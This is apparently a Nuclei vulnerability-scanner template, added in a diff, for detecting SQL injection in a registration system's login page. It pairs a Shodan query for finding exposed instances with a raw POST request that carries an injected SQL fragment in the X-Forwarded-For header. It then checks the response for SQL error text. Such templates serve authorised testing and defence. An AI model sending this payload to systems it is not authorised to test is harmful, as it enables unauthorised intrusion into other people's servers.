@@ -1,0 +1,32 @@
+id: Registration_system_XFF_SQL_injection
+
+info:
+  name: Registration_system_XFF_SQL_injection
+  author: HK
+  severity: high
+  description: XFF sql injection into a registration system
+  metadata:
+    max-request: 1
+    shodan-query: body="res/img/ht_box_back.gif" 
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /m/login.php?op=login HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+    Content-Type: application/x-www-form-urlencoded
+    x-forwarded-for: "127.0.0.1 ' and exists(select * from xxxxx)-- 123"
+    Content-Length: 88
+
+    username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - select
